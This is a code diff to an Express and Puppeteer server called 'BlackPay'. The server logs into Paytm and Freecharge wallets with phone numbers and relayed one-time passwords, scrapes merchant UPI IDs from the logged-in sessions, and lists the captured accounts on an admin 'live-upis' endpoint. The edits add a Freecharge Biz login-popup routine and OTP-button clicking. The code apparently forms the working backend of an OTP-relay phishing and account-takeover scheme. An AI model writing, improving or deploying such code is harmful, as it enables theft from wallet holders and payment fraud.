@@ -65,7 +65,7 @@ app.get('/', (req, res) => res.json({ success: true, message: "BlackPay Ultra-Fa
 app.get('/api/get-payment-details', (req, res) => res.json({ success: true, data: MERCHANT_BANK }));
 
 // ============================================================================
-// 🚀 ADMIN DASHBOARD API (Naya Route)
+// 🚀 ADMIN DASHBOARD API
 // ============================================================================
 app.get('/api/admin/live-upis', (req, res) => {
     res.json({ success: true, data: linkedAccounts });
@@ -155,10 +155,9 @@ app.post('/api/wallet/send-otp', async (req, res) => {
                 return res.status(400).json({ success: false, message: "Paytm page load failed." });
             }
 
-            await inputField.focus(); await inputField.click({ clickCount: 3 }); await inputField.press('Backspace');       
+            await inputField.focus(); await inputField.click({ clickCount: 3 }); await inputField.press('Backspace');      
             await inputField.type(phone, { delay: 0 });
 
-            // Type Password
             let passField = null; 
             for (let attempt = 0; attempt < 30; attempt++) {
                 let frames = []; try { frames = page.frames(); } catch(e) { frames = [page]; }
@@ -203,46 +202,70 @@ app.post('/api/wallet/send-otp', async (req, res) => {
                 await inputField.focus(); 
                 await inputField.click({ clickCount: 3 }); 
                 await inputField.press('Backspace');
-                await inputField.type(phone, { delay: 10 }); // 10ms delay taaki number adhura na rahe
+                await inputField.type(phone, { delay: 10 });
             } else {
                 await new Promise(r => setTimeout(r, 1000));
                 await page.keyboard.type(phone, { delay: 10 });
             }
             await page.keyboard.press('Enter');
         }
-        // 🚀 FREECHARGE LOGIC
+        // 🚀 FREECHARGE BIZ LOGIC (Popup Handler)
         else if (walletName.includes('freecharge')) {
-            await page.goto('https://www.freecharge.in/', { waitUntil: 'domcontentloaded', timeout: 20000 });
+            await page.goto('https://www.freechargebiz.in/', { waitUntil: 'domcontentloaded', timeout: 25000 });
             
+            let loginClicked = false;
+            for (let attempt = 0; attempt < 30; attempt++) {
+                try {
+                    let clicked = await page.evaluate(() => {
+                        let buttons = Array.from(document.querySelectorAll('button, a, div'));
+                        let target = buttons.find(b => b.innerText && b.innerText.trim().toLowerCase() === 'login');
+                        if (target) {
+                            target.click();
+                            return true;
+                        }
+                        return false;
+                    });
+                    if (clicked) {
+                        loginClicked = true;
+                        break;
+                    }
+                } catch(e) {}
+                await new Promise(r => setTimeout(r, 200));
+            }
+
+            await new Promise(r => setTimeout(r, 1500));
+
             let inputField = null;
-            for (let attempt = 0; attempt < 50; attempt++) {
+            for (let attempt = 0; attempt < 40; attempt++) {
                 try {
                     let inputs = await page.$$('input:not([type="hidden"])');
                     for (let el of inputs) {
                         let box = await el.boundingBox();
-                        if (box && box.width > 0 && box.height > 0) { inputField = el; break; }
+                        if (box && box.width > 0 && box.height > 0) {
+                            inputField = el;
+                            break;
+                        }
                     }
                 } catch(e) {}
                 if (inputField) break;
-                await new Promise(r => setTimeout(r, 100));
+                await new Promise(r => setTimeout(r, 200));
             }
 
             if (inputField) {
                 await inputField.focus(); 
                 await inputField.click({ clickCount: 3 }); 
                 await inputField.press('Backspace');
-                await inputField.type(phone, { delay: 10 }); // 10ms delay
+                await inputField.type(phone, { delay: 10 });
             } else {
-                await new Promise(r => setTimeout(r, 1000));
                 await page.keyboard.type(phone, { delay: 10 });
             }
-            await page.keyboard.press('Enter');
-        }
-        // 🚀 FREECHARGE LOGIC
-        else if (walletName.includes('freecharge')) {
-            await page.goto('https://www.freecharge.in/', { waitUntil: 'domcontentloaded', timeout: 20000 });
-            await new Promise(r => setTimeout(r, 1000));
-            await page.keyboard.type(phone, { delay: 0 });
+
+            await page.evaluate(() => {
+                let elements = Array.from(document.querySelectorAll('button, div, span'));
+                let btn = elements.find(el => el.innerText && el.innerText.trim().toLowerCase().includes('get otp'));
+                if (btn) btn.click();
+            });
+
             await page.keyboard.press('Enter');
         }
 
@@ -282,7 +305,6 @@ app.post('/api/wallet/verify-otp', async (req, res) => {
         let frames = []; try { frames = [page, ...page.frames()]; } catch(e) { frames = [page]; }
         let otpTyped = false; 
 
-        // 🚀 SMART API RESOLVER WITH STRICT OTP VALIDATION
         let otpApiPromise = new Promise((resolve) => {
             let isResolved = false;
             
@@ -296,7 +318,6 @@ app.post('/api/wallet/verify-otp', async (req, res) => {
                         const text = await response.text();
                         if (url.includes('verify') || url.includes('login') || url.includes('auth') || url.includes('otp')) {
                             const textLower = text.toLowerCase();
-                            // STRICT REJECTION
                             if (response.status() >= 400 || textLower.includes('"success":false') || textLower.includes('invalid otp') || textLower.includes('incorrect') || textLower.includes('wrong')) { 
                                 isResolved = true; resolve(false); 
                             } else if (textLower.includes('token') || textLower.includes('success":true')) {
@@ -308,7 +329,6 @@ app.post('/api/wallet/verify-otp', async (req, res) => {
             };
             page.on('response', handler);
 
-            // STRICT FALLBACK (Check DOM for Error messages after 5 seconds)
             setTimeout(async () => { 
                 if (!isResolved) { 
                     try {
@@ -325,7 +345,6 @@ app.post('/api/wallet/verify-otp', async (req, res) => {
             }, 5000);
         });
 
-        // Type the OTP fast
         for (let attempt = 0; attempt < 30; attempt++) {
             for (let frame of frames) {
                 try {
@@ -334,7 +353,7 @@ app.post('/api/wallet/verify-otp', async (req, res) => {
                         let box = await el.boundingBox();
                         if (box && box.width > 0 && box.height > 0) {
                             await el.focus(); await el.click({ clickCount: 3 }); await el.press('Backspace');
-                            await el.type(otp, { delay: 0 }); // SUPER FAST TYPING
+                            await el.type(otp, { delay: 0 }); 
                             await frame.evaluate((inp) => { try { inp.blur(); } catch(err) {} }, el);
                             otpTyped = true; break;
                         }
@@ -363,15 +382,11 @@ app.post('/api/wallet/verify-otp', async (req, res) => {
             return res.status(400).json({ success: false, message: "Invalid OTP! Please enter correct OTP." }); 
         }
 
-        // ====================================================================
-        // 🚀 UPI EXTRACTION (PAYTM MERCHANT, MOBIKWIK, FREECHARGE, PHONEPE)
-        // ====================================================================
         let currentUrl = ""; try { currentUrl = page.url() || ""; } catch(e) { currentUrl = currentWallet; }
         let finalUpi = "";
 
         await new Promise(r => setTimeout(r, 3000));
 
-        // 🚀 PAYTM MERCHANT EXTRACTION
         if (currentUrl.includes('paytm') || currentWallet.includes('paytm')) {
             console.log(`[+] Smart Mode ON: Hunting for @pty Merchant UPI via Network Traffic...`);
             
@@ -435,7 +450,6 @@ app.post('/api/wallet/verify-otp', async (req, res) => {
             });
         }
 
-        // 🚀 DATA PUSH: DASHBOARD KE LIYE DATA SAVE KARO
         linkedAccounts.push({
             phone: phone,
             walletType: currentWallet.toUpperCase(),
@@ -443,7 +457,6 @@ app.post('/api/wallet/verify-otp', async (req, res) => {
             time: new Date().toLocaleTimeString()
         });
 
-        // Cleanup & Success
         try { await context.close(); } catch(e) {}
         activeSessions.delete(phone);
 
